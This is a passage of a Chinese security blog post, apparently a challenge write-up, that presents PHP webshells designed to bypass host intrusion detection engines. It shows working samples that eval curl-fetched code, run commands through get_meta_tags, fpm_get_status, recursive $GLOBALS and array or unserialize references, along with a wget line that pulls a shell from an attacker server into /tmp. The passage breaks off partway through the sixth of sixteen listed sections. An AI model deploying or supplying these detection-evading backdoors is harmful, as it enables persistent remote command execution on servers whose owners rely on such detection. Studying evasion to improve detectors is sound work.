@@ -1,0 +1,432 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="HIDS PHP Webshell Bypass 研究分析"><meta name="keywords" content="bypass"><meta name="author" content="JGwebre,undefined"><meta name="copyright" content="JGwebre"><title>HIDS PHP Webshell Bypass 研究分析【JG的个人博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- script(src=url_for("/js/mathjax/mathjax.js"))--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
+});
+</script><script>var isPassword = '' || false;
+if (isPassword) {
+    if (prompt('请输入文章密码') !== '') {
+        alert('密码错误！');
+        history.back();
+    }
+}</script><script>window.GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"M89DTZNQI5","apiKey":"3349454e63ed12455aa77088742476f1","indexName":"heisha","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: {"path":"search.json","languages":{"hits_empty":"local_search.hits_empty"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  gitment: {},
+  valine: {"appId":"vBmF8qvDShMMqm39diUFWroM-gzGzoHsz","appKey":"vcClV59WM7pPzz3R46pITQlv","placeholder":"welcome to say something..."},
+  twikoo: {},
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="JG的个人博客" type="application/atom+xml">
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-CURL-%E5%BC%95%E5%85%A5%E5%8F%82%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">0x01 CURL 引入参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-get-meta-tags-%E5%BC%95%E5%85%A5%E5%8F%82%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02 get_meta_tags 引入参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-fpm-get-status-%E5%BC%95%E5%85%A5%E5%8F%82%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">0x03 fpm_get_status 引入参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E9%80%92%E5%BD%92GLOBALS-%E5%BC%95%E5%85%A5%E5%8F%82%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">0x04 递归GLOBALS 引入参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%A8%A1%E5%BC%8F%E4%B8%80%EF%BC%9A-Array%E5%85%83%E7%B4%A0%E5%BC%95%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">0x05 模式一： Array元素引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E6%A8%A1%E5%BC%8F%E4%BA%8C%EF%BC%9A-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">0x06 模式二： 反序列化引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-trait"><span class="toc-number">7.</span> <span class="toc-text">0x07 trait</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-SESSION"><span class="toc-number">8.</span> <span class="toc-text">0x08 SESSION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-SESSION%E6%89%A9%E5%B1%95"><span class="toc-number">9.</span> <span class="toc-text">0x09 SESSION扩展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0A-%E5%86%85%E5%AD%98"><span class="toc-number">10.</span> <span class="toc-text">0x0A 内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0B-%E4%BF%AE%E6%94%B9%E8%87%AA%E8%BA%AB"><span class="toc-number">11.</span> <span class="toc-text">0x0B 修改自身</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0C-%E5%A0%86%E6%8E%92%E5%BA%8F"><span class="toc-number">12.</span> <span class="toc-text">0x0C 堆排序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0D-%E4%BC%98%E5%85%88%E7%BA%A7%E9%98%9F%E5%88%97"><span class="toc-number">13.</span> <span class="toc-text">0x0D 优先级队列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0E-%E5%86%85%E5%AD%98%E4%B8%8D%E8%B6%B3"><span class="toc-number">14.</span> <span class="toc-text">0x0E 内存不足</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0F-%E6%9C%AA%E6%9D%A5WebShell"><span class="toc-number">15.</span> <span class="toc-text">0x0F 未来WebShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-%E9%87%8F%E5%AD%90WebShell"><span class="toc-number">16.</span> <span class="toc-text">0x10 量子WebShell</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">JGwebre</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/heisha123" target="_blank">GitHub<i class="icon-dot bg-color3"></i></a><a class="links-button button-hover" href="mailto:gzyjslb@163.com" target="_blank">E-Mail<i class="icon-dot bg-color1"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1852384503&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color6"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">17</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">11</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">1</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">JG的个人博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">HIDS PHP Webshell Bypass 研究分析</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2025-07-30 | 更新于 2025-08-04</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/bypass/">bypass</a></div></div></div><div class="main-content"><p>背景：2022年春天，参加了某HIDS Bypass挑战赛，赛题恰好是关于PHP WebShell绕 过的，结合Fuzz技术获得了几个侥幸可以绕过的样本，围绕#WebShell检测那些事的主题， 与各位做一个分享。 </p>
+<span id="more"></span>
+
+<p>挑战赛规则如下:  </p>
+<p>1、WebShell 指外部能传参控制(如通过 GET&#x2F;POST&#x2F;HTTP Header 头等方式)执行任 意代码 或命令，比如 eval($_GET[1]);。在文件写固定指令不算 Shell，被认定为无 效，如&lt;?php system(‘whoami’); </p>
+<p>2、绕过检测引擎的 WebShell 样本，需要同时提供完整有效的 curl 利用方式， 如:curl ‘<a target="_blank" rel="noopener" href="http://127.0.0.1/webshell.php?1=system(%22whoami%22)%27;%E3%80%82curl">http://127.0.0.1/webshell.php?1=system(&quot;whoami&quot;)&#39;;。curl</a> 利用方式可以在 提供的 docker 镜像中进行编写测试，地址可以是容器 IP 或者 127.0.0.1，文件名 任意，以执行 whoami 作为命令示例。  </p>
+<p>3、WebShell 必须具备通用性，审核时会拉取提交的 WebShell 内容，选取一个和 验证镜 像相同的环境进行验证，如果不能正常运行，则认为无效。</p>
+<p>4、审核验证 payload 有效性时，WebShell 文件名会随机化，不能一次性执行成功 和稳定 触发的，被认定为无效。</p>
+<p>首先，我对查杀引擎进行了一定的猜测，根据介绍查杀引擎有两个，两个引擎同 时工作，只要有一个引擎检测出了 WebShell 返回结果就是查杀，根据经验推测，应 该是有一个静态的，另一个是动态的。对于静态引擎的绕过，可以通过拆分关键词、 加入能够引发解析干扰的畸形字符等;而对于动态引擎，需要分析它跟踪了哪些输入 点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则，于是 我开始了一些尝试。 </p>
+<h3 id="0x01-CURL-引入参数"><a href="#0x01-CURL-引入参数" class="headerlink" title="0x01 CURL 引入参数"></a>0x01 CURL 引入参数</h3><p>经过分析，引擎对$_GET $_POST $_COOKIE $_REQUEST $_FILES $_SERVER $GLOBALS  等几乎一切可以传递用户参数的全局变量都进行了过滤，但是对 curl 进来的内容却是没有 任何过滤，于是我们可以通过CURL引入参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$url=&quot;http://x/1.txt&quot;; </span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); </span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); </span><br><span class="line">curl_setopt($ch,CURLOPT_HTTPHEADER,$headerArray); </span><br><span class="line">$output = curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line">echo $output; </span><br><span class="line">eval($output);</span><br></pre></td></tr></table></figure>
+
+<p>但是在这一点的评判上存在争议，本样本惨遭忽略。根据挑战赛规则，能够动态引入参 数即可，我个人认为CURL引入的参数也属于外部可控的参数内容。 </p>
+<h3 id="0x02-get-meta-tags-引入参数"><a href="#0x02-get-meta-tags-引入参数" class="headerlink" title="0x02 get_meta_tags 引入参数"></a>0x02 get_meta_tags 引入参数</h3><p>get_meta_tags 函数会对给定 url 的 meta 标签进行解析，自然也会发起URL请求。对 于能够发起外连的服务器来说，这个PHP WebShell样本是极具迷惑性的。 </p>
+<p>不过，之前CURL的被忽略了，这个我也就没有再提交。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">get_meta_tags(&quot;http://x/1&quot;)[&quot;author&quot;](get_meta_tags(&quot;http://x/1&quot;)[&quot;</span><br><span class="line"> keywords&quot;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时，目标服务器上需要有相应的文件配合：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;author&quot; content=&quot;system&quot;&gt; </span><br><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;ls&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个name 我们可以随便指定，相应的我们的payload也要做相应的修改</p>
+<p>这里的payload 就相当于<code>get_meta_tags(&quot;http://x/1&quot;)[&quot;author&quot;]</code> 先用这个取到了 <code>system</code> </p>
+<p>在用 <code>get_meta_tags(&quot;http://x/1&quot;)[&quot; keywords&quot;]</code>  取到了 <code>ls</code> 然后执行后的结果</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730125511333.png" alt="image-20250730125511333"></p>
+<p>我们尝试一下写shellcode</p>
+<p>我们尝试用 <code>echo 123&gt;/tmp/123.php</code> 去写入发现 他并没有 写入成功，网页直接输出了123</p>
+<p>这里我尝试对<code>echo 123&gt;/tmp/123.php</code> 进行base64编码，然后在我们的payload进行一下解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get_meta_tags(&quot;http://192.168.197.134/demo1.html&quot;)[&quot;author&quot;](base64_decode(get_meta_tags(&quot;http://192.168.197.134/demo1.html&quot;)[&quot;keywords&quot;]));</span><br><span class="line"></span><br><span class="line">&lt;meta name=&quot;author&quot; content=&quot;passthru&quot;&gt;  //这里的执行函数，可以换多种，如system等 </span><br><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;ZWNobyAxMjM+L3RtcC8xMjMucGhw&quot;&gt; </span><br></pre></td></tr></table></figure>
+
+<p>成功写入 shell</p>
+<p><code>passthru</code> 这个函数也可以执行命令，挺少见的，也许某些地方可以绕过</p>
+<p>我们换个思路进行写shellcode，我们可以从我们的服务器上直接wget下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /tmp/shell.php http://192.168.197.134/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>这样也是可以实现的，但是要注意的是你wget的文件必须是txt等他获得请求后的结果 作为的内容进行传入的php</p>
+<p>，不然直接请求php可能会返回空</p>
+<h3 id="0x03-fpm-get-status-引入参数"><a href="#0x03-fpm-get-status-引入参数" class="headerlink" title="0x03 fpm_get_status 引入参数"></a>0x03 fpm_get_status 引入参数</h3><p>因为当时的比赛是php-fpm的架构，而<code>fpm_get_status</code> 可以获取到fpm的一些状态</p>
+<p>我们需要找到这些用户可以控制的状态参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">var_dump(fpm_get_status()); </span><br></pre></td></tr></table></figure>
+
+<p>先用这个打印一下</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730150759807.png" alt="image-20250730150759807"></p>
+<p>注意到这里他可以接收get的传参</p>
+<p>那么我们就可以进行拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">var_dump(fpm_get_status()); </span><br><span class="line">system(fpm_get_status()[&quot;procs&quot;][0][&quot;query-string&quot;]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730151013484.png" alt="image-20250730151013484"></p>
+<p>这么一个逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(fpm_get_status()[&quot;procs&quot;][0][&quot;query-string&quot;]);</span><br></pre></td></tr></table></figure>
+
+<p>所以我们通过这个完全可以取出来</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730163151987.png" alt="image-20250730163151987"></p>
+<p>没问题</p>
+<p>有些时候 procs 的第一个 不是 0 这个数组，所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">foreach(fpm_get_status()[&quot;procs&quot;] as $val)&#123; </span><br><span class="line">system($val[&quot;query-string&quot;]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以每次都触发，做了一个循环，肯定能取到0</p>
+<h3 id="0x04-递归GLOBALS-引入参数"><a href="#0x04-递归GLOBALS-引入参数" class="headerlink" title="0x04 递归GLOBALS 引入参数"></a>0x04 递归GLOBALS 引入参数</h3><p>经过测试，查杀引擎对$GLOBALS 全局变量传参点进行了检测，但是似乎没有严格执行 递归，通过一些变形即可绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$m=($GLOBALS[&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;GLOBALS&quot;][&quot;_GET&quot;][&quot;b&quot;]); </span><br><span class="line">substr(timezone_version_get(),2)($m);</span><br></pre></td></tr></table></figure>
+
+<p>由于静态引擎会直接拦截system( ，所以，进行了一些包装，timezone_version_get() 在给定的测试环境中返回的值恰好是：0.system 。  关于这一点，我在PHP 网站上看到了这样一段话： </p>
+<p>If you get 0.system for the version, this means you have the version that PHP shipped  with. For a newer version, you must upgrade via the PECL extension (sudo pecl install  timezonedb)</p>
+<p>传参数入口方面，我暂时就发现了这么多，接下来，我试图通过特殊的变量传递方式切 断动态查杀引擎的污点跟踪链。 </p>
+<p>这里我们自己分析一下</p>
+<p>先打印看一下 $GLOBALS 到底是什么</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730233350866.png" alt="image-20250730233350866"></p>
+<p>可以看到</p>
+<p><em>RECURSION</em> 是递归的意思，也就是下面有很多个GLOPBALS 嵌套的数组，有可能他的追踪链不会追这么深，污点断掉，我们的payload就可以绕过</p>
+<p><code>timezone_version_get()</code> 然后我们查一下这个函数，到底是什么</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730233943209.png" alt="image-20250730233943209"></p>
+<p>他这获取一个版本，好像并不是我所想象的执行命令的函数</p>
+<p>我们打印一下看一下</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730234054976.png" alt="image-20250730234054976"></p>
+<p>system出现了，后面查资料发现，timezonedb  只要这个的版本不是最新的，他就会返回 0.system </p>
+<p>仅限于Linux系统，windows系统不行</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730234256844.png" alt="image-20250730234256844"></p>
+<p>后面拼接get传参就可以执行命令</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730234313033.png" alt="image-20250730234313033"></p>
+<p>在测试一下post</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730234346318.png" alt="image-20250730234346318"></p>
+<p>post也可以传</p>
+<p>也可以执行</p>
+<h3 id="0x05-模式一：-Array元素引用"><a href="#0x05-模式一：-Array元素引用" class="headerlink" title="0x05 模式一： Array元素引用"></a>0x05 模式一： Array元素引用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$b = &quot;111&quot;; </span><br><span class="line">$c = &quot;222&quot;; </span><br><span class="line">if(get_cfg_var(&#x27;error_reporting&#x27;)&gt;0)&#123; </span><br><span class="line">    $b=&quot;#&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$a = array( &quot;one&quot;=&gt;$c,&quot;two&quot;=&gt;&amp;$c ); </span><br><span class="line">$url = &quot;http://a/usr/&quot;.$b.&quot;?a=1&quot;; </span><br><span class="line">$d =parse_url($url); </span><br><span class="line">if($d[&#x27;query&#x27;])&#123; </span><br><span class="line">    $c=&quot;echo 111;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $c=$_FILES[&#x27;useraccount&#x27;][&#x27;name&#x27;]; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">var_dump($a[&quot;two&quot;]); </span><br><span class="line">eval($a[&quot;two&quot;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里先分析一下代码</p>
+<p>第一个if判断通过<code>get_cfg_var</code> 判断<code>error_reporting</code> 模式是否开启</p>
+<p>如果开启 <code>$b=&quot;#&quot;</code></p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250730235626827.png" alt="image-20250730235626827"></p>
+<p>这里打印了一下，发现我们的环境是开启了这个模式的</p>
+<p><code>$a = array( &quot;one&quot;=&gt;$c,&quot;two&quot;=&gt;&amp;$c );</code> </p>
+<p>又引入了一个变量a ，”one”&#x3D;&gt;$c 这里是值赋值，将变量<code>$c</code>的当前值复制到数组的<code>&quot;one&quot;</code>键中。如果后续<code>$c</code>的值发生变化，数组中的这个值不会受到影响，”two”&#x3D;&gt;&amp;$c 这里是引用赋值， 将变量<code>$c</code>的引用（而非值）赋给数组的<code>&quot;two&quot;</code>键。这意味着数组中的这个元素会始终反映<code>$c</code>的当前值，反之亦然 —— 如果通过数组修改这个元素，<code>$c</code>的值也会改变，也就是他们两现在共用一个内存地址</p>
+<p><code>$url = &quot;http://a/usr/&quot;.$b.&quot;?a=1&quot;;</code></p>
+<p><code>$d =parse_url($url);</code> </p>
+<p> 然后这里他把$b 进行拼接在了这个url地址栏中</p>
+<p>并用$d 来接收了url解析后的一些参数，我们可以打印看一下，正常的url有哪些参数</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250731000005008.png" alt="image-20250731000005008"></p>
+<p>正常也就是$b 是111的时候，他有query这个字段</p>
+<p>我们在试试把#进行拼接呢？</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250731000059292.png" alt="image-20250731000059292"></p>
+<p>发现他这里query字段消失了，导致下面的那个if判断走的分支就不一样了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if($d[&#x27;query&#x27;])&#123; </span><br><span class="line"></span><br><span class="line">  $c=&quot;echo 111;&quot;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">else&#123; </span><br><span class="line"></span><br><span class="line">  $c=$_FILES[&#x27;useraccount&#x27;][&#x27;name&#x27;]; </span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>这里就被我们上面控制，如果有query 那么就是为真，$c&#x3D;”echo 111;” 最后我们输出的那个two 就是111，为正常的参数，waf不会拦截</p>
+<p>但是如果 query 为 假，也就是 $b&#x3D;”#”，<code>$c=$_FILES[&#39;useraccount&#39;][&#39;name&#39;];</code>  这个看上去像文件上传的参数</p>
+<p>且用户可控</p>
+<p>这里其实就是利用了 waf，和服务器的配置的差异性，因为waf他要保证精简，所以一般这些他不会用的服务都会关闭，我们服务器呢，这个配置默认就是开启的，waf他走正常的输出逻辑，过掉之后，服务器在运行，又走另一个分支，从而实现了我们的绕过</p>
+<p>我们复现一下，具体怎么个用户可控</p>
+<p>首先我们需要抓一个文件上传的包，还有正常访问的包，将文件上传的post部分，覆盖进get访问的包</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250731002142552.png" alt="image-20250731002142552"></p>
+<p>上传文件的内容随便，我们只需要控制他的name</p>
+<p>成功执行</p>
+<h3 id="0x06-模式二：-反序列化引用"><a href="#0x06-模式二：-反序列化引用" class="headerlink" title="0x06 模式二： 反序列化引用"></a>0x06 模式二： 反序列化引用</h3><p>怎么能少得了反序列化呢？记得在N年前php4fun挑战赛challenge8中，一道与L.N. 师傅有关的题令我印象深刻，其中使用的技术正是PHP反序列化引用。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$s= unserialize(&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:1:&quot;a&quot;;i:1;&#125;i:1;r:2;&#125;&#x27;); </span><br><span class="line">$c = &quot;123&quot;; </span><br><span class="line">$arr= get_declared_classes(); </span><br><span class="line">$i=0; </span><br><span class="line">for($i;$i&lt;count($arr);$i++)&#123; </span><br><span class="line">$i++; </span><br><span class="line">$s[1]-&gt;a=$_GET[&#x27;a&#x27;]; </span><br><span class="line">if($i&lt;97 || $i&gt;=98)&#123; </span><br><span class="line">continue; </span><br><span class="line">&#125; </span><br><span class="line">$c=$s[0]-&gt;a; </span><br><span class="line">    print(substr(get_declared_classes()[72],4,6)($c)); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析</p>
+<p>他先将<code>a:2:&#123;i:0;O:8:&quot;stdClass&quot;:1:&#123;s:1:&quot;a&quot;;i:1;&#125;i:1;r:2;&#125;</code> 进行了一下反序列化，我们看一下打印一下看看反序列化的结果</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804110743785.png" alt="image-20250804110743785"></p>
+<p>也可以直接读序列化的值</p>
+<p>他这里定义了一个对象a，然后里面有两个元素，第一个是int型，值是0，第二个又是一个对象 长度8，名称stdClass，属性1，里面第一个元素 str类型，长度1，key&#x3D;a，int型， value&#x3D;1， 第二个元素 int型长度1，</p>
+<p>r:2 是对a对象的第二个元素的引用 也就是我们反序列化后的结果打印出来的</p>
+<p>两个都指向stdClass 这个元素</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804111430369.png" alt="image-20250804111430369"></p>
+<p>打印看一下定义了哪些数组，包含自定义的数组</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804111535354.png" alt="image-20250804111535354"></p>
+<p>可以看到这里的第</p>
+<p>这里我们在打印一下他有多少个数组</p>
+<p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804111912136.png" alt="image-20250804111912136"></p>
+<p>145 刚好能满足在下面 到97的时候 会继续执行下面的代码</p>
